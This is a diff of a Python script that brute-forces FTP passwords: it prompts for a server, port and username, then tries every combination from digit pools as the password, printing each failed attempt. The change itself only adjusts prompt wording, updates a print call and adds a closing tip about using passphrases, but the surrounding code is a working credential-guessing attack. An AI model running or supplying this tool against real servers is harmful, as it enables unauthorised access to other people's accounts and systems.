@@ -13,9 +13,9 @@ l6 = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
 l7 = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
 l8 = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
 pool=[l3,l4,l5,l6,l7,l8]
-host = raw_input('Enter the ip of the ftp server you would like to connect to: ')
-port = raw_input('Enter the port you would like to use: ')
-user = raw_input('Enter the username: ')
+host = raw_input('Enter the IP of the ftp server you would like to connect to: ')
+port = raw_input('Enter the Port you would like to use: ')
+user = raw_input('Enter the Username: ')
 start = time.time()
 fp = ftplib.FTP()
 fp.connect(host, port)
@@ -27,4 +27,5 @@ for n in itertools.product(*pool):
 		break
 	except ftplib.all_errors:
 		print("could not authenticate with username " + user + " and password " + ''.join(n))
-print "program ran for", time.time() - start, "seconds"
+print("program ran for", time.time() - start, "seconds")
+print("always use passwords like passphrase not like C3r42p :)")
